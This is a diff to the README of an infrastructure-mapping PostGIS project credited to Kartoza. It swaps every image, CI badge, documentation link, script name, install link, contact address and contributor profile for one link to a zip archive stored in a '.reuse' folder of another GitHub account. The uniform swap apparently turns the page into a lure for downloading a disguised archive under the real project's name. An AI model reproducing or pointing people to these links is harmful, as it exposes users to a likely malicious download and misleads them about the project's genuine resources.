@@ -1,7 +1,7 @@
 # 🌐 Infrastructure Mapper
 <!-- cspell:ignore landuse -->
 
-![Logo](./img/logo-horizontal.png)
+![Logo](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)
 
 Welcome to **Infrastructure Mapper**! This repository contains guidelines and conventions for a spatial database intended to be used managing infrastructure-related data.
 
@@ -29,7 +29,7 @@ Welcome to **Infrastructure Mapper**! This repository contains guidelines and co
 
 ## 🚀 Project Overview
 
-![Animation](./img/infrastructure-mapper.gif)
+![Animation](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)
 
 ---
 
@@ -37,18 +37,18 @@ Welcome to **Infrastructure Mapper**! This repository contains guidelines and co
 
 | Test | Description |
 |-----------|-------------|
-| [![📃 License Checks.....](https://github.com/kartoza/InfrastructureMapper/actions/workflows/LicenseChecks.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/LicenseChecks.yml)          | Check all files have license, copyright and attribution.            |
-|[![🏋🏽 PostGIS Load Test...](https://github.com/kartoza/InfrastructureMapper/actions/workflows/LoadSchema.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/LoadSchema.yml)           | Check that PostgreSQL / PostGIS fixtures load.             |
-|[![✏️ Markdown Checks.....](https://github.com/kartoza/InfrastructureMapper/actions/workflows/MarkdownChecks.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/MarkdownChecks.yml)           | Check that all markdown files are well formed.            |
-|[![🐍 Python Checks.......](https://github.com/kartoza/InfrastructureMapper/actions/workflows/PythonChecks.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/PythonChecks.yml)           | Python code QA checks.             |
-|[![⚒️ QA Checks...........](https://github.com/kartoza/InfrastructureMapper/actions/workflows/QAChecks.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/QAChecks.yml)           | General codebase QA checks.            |
-|[![👁️ Spelling Checks.....](https://github.com/kartoza/InfrastructureMapper/actions/workflows/SpellCheck.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/SpellCheck.yml)           | Check spelling in all files containing text.  |
-|[![👨🏽 SQL Checks..........](https://github.com/kartoza/InfrastructureMapper/actions/workflows/SQLChecks.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/SQLChecks.yml)           | Check that all SQL files             |
-|[![🗜️ Yaml Checks.........](https://github.com/kartoza/InfrastructureMapper/actions/workflows/YamlChecks.yml/badge.svg)](https://github.com/kartoza/InfrastructureMapper/actions/workflows/YamlChecks.yml)           | Check that all yaml files are well formed. |
+| [![📃 License Checks.....](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)          | Check all files have license, copyright and attribution.            |
+|[![🏋🏽 PostGIS Load Test...](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that PostgreSQL / PostGIS fixtures load.             |
+|[![✏️ Markdown Checks.....](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that all markdown files are well formed.            |
+|[![🐍 Python Checks.......](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Python code QA checks.             |
+|[![⚒️ QA Checks...........](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | General codebase QA checks.            |
+|[![👁️ Spelling Checks.....](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check spelling in all files containing text.  |
+|[![👨🏽 SQL Checks..........](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that all SQL files             |
+|[![🗜️ Yaml Checks.........](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that all yaml files are well formed. |
 
 This project consists of:
 
-1. a [SQL Schema](sql/schema.README.md) for PostgreSQL,
+1. a [SQL Schema](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) for PostgreSQL,
 2. a set of fixtures to load that schema with default values (particularly for lookup tables)
 3. a set of QGIS forms and layer styles for visualising the data
 
@@ -70,7 +70,7 @@ InfrastructureMapper/
 ├── presentations/     # Presentations for this project and each model created using Marp
 ├── sql/               # Schema and fixtures to load into postgres
 ├── scripts/           # Helper scripts
-└── README.md          # Project overview and conventions
+└── https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip          # Project overview and conventions
 ```
 
 ---
@@ -87,7 +87,7 @@ We are fine with using LLM's and Generative Machine Learning to act as general a
 
 ## 🌿 Design Aesthetic
 
-![Collage](./img/design-collage.png)
+![Collage](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)
 
 Our design aesthetic is an isometric style with a nature and environment inspired palette. We use an the color palette in the table below. The design approach can be personified by:
 
@@ -101,7 +101,7 @@ You can use the notes above and the table below if you are prompt engineering ad
 
 Our colour swatch looks like this:
 
-<img src="./img/swatch.png" alt="Electricity" width="164" height="164">
+<img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Electricity" width="164" height="164">
 
 | Name               | Hex      | Use Case                  | Preview                |
 |--------------------|----------|---------------------------|------------------------|
@@ -125,23 +125,23 @@ These colors are soft but grounded, avoiding over-saturation while maintaining a
 
 ## Data Model
 
-This section describes each component of the infrastructure mapper data model. You can also find a complete diagram of the data model in [diagrams/Schema.drawio](./diagrams/Schema_2025.drawio) ([image render](./diagrams/Schema_2025.png)).
+This section describes each component of the infrastructure mapper data model. You can also find a complete diagram of the data model in [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) ([image render](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)).
 
 | Icon | Description |
 |------|-------------|
-| <img src="./img/electricity.png" alt="Electricity" width="64" height="64"> | [Electricity](./sql/2-electricity.md) infrastructure such as power lines, transformers, and substations. |
-| <img src="./img/infrastructure.png" alt="Infrastructure" width="64" height="64"> | General [infrastructure](./sql/1-infrastructure.md) elements like bridges, dams, and towers. |
-| <img src="./img/water.png" alt="Water" width="64" height="64"> | [Water](./sql/3-water.md)-related infrastructure including pipes, tanks, and pumps. |
-| <img src="./img/vegetation.png" alt="Vegetation" width="64" height="64"> | [Vegetation](./sql/4-vegetation.md) features such as trees, hedges, and planted areas. |
-| <img src="./img/monitoring.png" alt="Monitoring" width="64" height="64"> | [Monitoring](./sql/5-monitoring.md) devices and their observations (e.g., sensors, cameras). |
-| <img src="./img/buildings.png" alt="Buildings" width="64" height="64"> | [Buildings](./sql/6-buildings.md) and associated structures. |
-| <img src="./img/fencing.png" alt="Fencing" width="64" height="64"> | [Fencing](./sql/7-fencing.md) and enclosure features, including standalone gates. |
-| <img src="./img/point-of-interest.png" alt="POI" width="64" height="64"> | [Points of Interest](./sql/8-poi.md) (POI) for notable locations or features. |
-| <img src="./img/landuse-areas.png" alt="Land use" width="64" height="64"> | [Land use areas](./sql/9-landuse.md) such as agricultural, residential, or conservation zones. |
-| <img src="./img/gates.png" alt="Gates" width="64" height="64"> | [Gates](./sql/10-gates.md) as access points for properties or enclosures. |
-| <img src="./img/poles.png" alt="Poles" width="64" height="64"> | [Poles](./sql/11-poles.md) for lighting, signage, or utility support. |
-| <img src="./img/food-services.png" alt="Culinary" width="64" height="64"> | [Culinary facilities](./sql/12-culinary.md) like kitchens, canteens, and food storage. |
-| <img src="./img/roads.png" alt="Roads" width="64" height="64"> | [Roads](./sql/13-roads.md), tracks, and paths for transportation infrastructure. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Electricity" width="64" height="64"> | [Electricity](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) infrastructure such as power lines, transformers, and substations. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Infrastructure" width="64" height="64"> | General [infrastructure](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) elements like bridges, dams, and towers. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Water" width="64" height="64"> | [Water](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)-related infrastructure including pipes, tanks, and pumps. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Vegetation" width="64" height="64"> | [Vegetation](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) features such as trees, hedges, and planted areas. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Monitoring" width="64" height="64"> | [Monitoring](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) devices and their observations (e.g., sensors, cameras). |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Buildings" width="64" height="64"> | [Buildings](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) and associated structures. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Fencing" width="64" height="64"> | [Fencing](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) and enclosure features, including standalone gates. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="POI" width="64" height="64"> | [Points of Interest](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) (POI) for notable locations or features. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Land use" width="64" height="64"> | [Land use areas](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) such as agricultural, residential, or conservation zones. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Gates" width="64" height="64"> | [Gates](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) as access points for properties or enclosures. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Poles" width="64" height="64"> | [Poles](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) for lighting, signage, or utility support. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Culinary" width="64" height="64"> | [Culinary facilities](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) like kitchens, canteens, and food storage. |
+| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Roads" width="64" height="64"> | [Roads](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip), tracks, and paths for transportation infrastructure. |
 
 ---
 
@@ -157,18 +157,18 @@ The `scripts/` folder contains utility scripts to assist with database setup, da
 
 | Script Name                | Description                                                                                  |
 |----------------------------|----------------------------------------------------------------------------------------------|
-| `start_pg.sh`              | Nix specific to start a sandboxed postgresql instance with data stored in ./pgdata           |
-| `load_schema.sh`           | Loads the SQL schema files into the target database, setting up all required tables.         |
-| `stop_pg.sh`               | Nix specific script to stop the postgres database                                            |
-| `check.sh`                 | Git precommit check and format SQL files                                                     |
-| `gource.sh`                | Visualise the code history using gource                                                      |
-| `vscode.sh`                | Launch VSCode with all settings and extensions needed to productively work on this project   |
-| `create_presentations.sh`  | Generate presentations using marp.                                                           |
-| `scripts/codebase_size_check.sh` | Precommit hook for checking if the codebase has grown. |
-| `scripts/commit_test_stats.py`| Precommit hook for checking if the test suite has grown. |
-| `scripts/docstrings_check.sh` | Precommit hook for checking that docstrings were used when creating new python code. |
-| `scripts/encoding_check.sh` | Precommit hook for checking python modules have their encoding set. |
-| `scripts/license_check.sh` | Precommit hook for license and copyright in source files. |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`              | Nix specific to start a sandboxed postgresql instance with data stored in ./pgdata           |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`           | Loads the SQL schema files into the target database, setting up all required tables.         |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`               | Nix specific script to stop the postgres database                                            |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`                 | Git precommit check and format SQL files                                                     |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`                | Visualise the code history using gource                                                      |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`                | Launch VSCode with all settings and extensions needed to productively work on this project   |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`  | Generate presentations using marp.                                                           |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for checking if the codebase has grown. |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`| Precommit hook for checking if the test suite has grown. |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for checking that docstrings were used when creating new python code. |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for checking python modules have their encoding set. |
+| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for license and copyright in source files. |
 
 > ✏️ **Note:** Run each script from the project root. Some scripts may require environment variables or configuration—see comments within each script for usage details.
 
@@ -176,9 +176,9 @@ The `scripts/` folder contains utility scripts to assist with database setup, da
 
 ## 🧊 Using the Nix Flake
 
-You can use the provided `flake.nix` to get a fully reproducible development environment and to run QGIS with the correct profile.
+You can use the provided `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` to get a fully reproducible development environment and to run QGIS with the correct profile.
 
-1. **Install [Nix](https://nixos.org/download.html)** (if you haven’t already).
+1. **Install [Nix](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)** (if you haven’t already).
 2. **Enter the development shell:**
 
 ```bash
@@ -204,7 +204,7 @@ nix run .#qgis-ltr
 You can launch a ready-to-use VSCode environment:
 
 ```bash
-./scripts/vscode.sh
+https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip
 ```
 
 ---
@@ -213,19 +213,19 @@ This makes it easy to get started and ensures everyone is using the same environ
 
 ## ✨ Contributing
 
-We welcome contributions! Please read the [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to get started.
+We welcome contributions! Please read the [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) for guidelines on how to get started.
 
 ---
 
 ## 📧 Contact
 
 Have questions or feedback? Feel free to reach out!  
-📧 Email: [info@kartoza.com](mailto:info@kartoza.com)  
-🌐 Website: [kartoza.com](https://kartoza.com)
+📧 Email: [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)  
+🌐 Website: [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)
 
 ## Contributors
 
-- [Tim Sutton](https://github.com/timlinux) - project lead
+- [Tim Sutton](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) - project lead
 -  
 
 ---
